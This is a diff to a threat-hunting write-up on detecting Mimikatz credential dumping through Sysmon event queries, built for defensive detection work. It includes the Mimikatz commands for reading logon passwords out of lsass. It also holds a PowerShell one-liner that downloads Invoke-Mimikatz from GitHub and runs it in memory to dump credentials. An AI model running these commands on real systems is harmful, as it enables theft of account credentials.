@@ -31,13 +31,15 @@ For the purposes of starting a classification of the threats that will be explor
 
 
 # Mimikatz as a standalone executable
-Here we focus solely on the most popular combination of commands (same applies for in-memory Mimikatz): 
+Here we focus solely on the most popular combination of commands (same applies for in-memory Mimikatz):
+
 ```
 privilege::debug
 sekurlsa::logonpasswords
 ```
 
 For in-memory Mimikatz we will also test it by direct download via powershell rather than downloading the script to disk:
+
 ```
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia
 /PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
@@ -77,7 +79,8 @@ Query: "mimikatz"  NOT "EventCode=4658"  NOT "EventCode=4689"  EventCode=10 | st
 
 ![ToTH1-04](../img/THL001-Mimikatz/Mimi-04.PNG)
 
-Interestingly enough, we can see here that Mimikatz accessing lsass.exe happens after a series of events where the Mimikatz process itself is accessed by other processes like cmd, conhost, csrss, taskmgr, and lsass itself (!) followed by wmiprvse. The first three we can discard, as they are generated due to the fact we are launching Mimikatz from the commandline. However, an interesting pattern to look for may be that, immediately before Mimikatz reads from lsass' memory, lsass itself reads from Mimikatz's one. 
+{% include note.html content="Interestingly enough, we can see here that Mimikatz accessing lsass.exe happens after a series of events where the Mimikatz process itself is accessed by other processes like cmd, conhost, csrss, taskmgr, and lsass itself (!) followed by wmiprvse. The first three we can discard, as they are generated due to the fact we are launching Mimikatz from the commandline. However, an interesting pattern to look for may be that, immediately before Mimikatz reads from lsass' memory, lsass itself reads from Mimikatz's one. " %}
+
 
 The interesting info about lsass accessing Mimikatz can be seen here: 
 
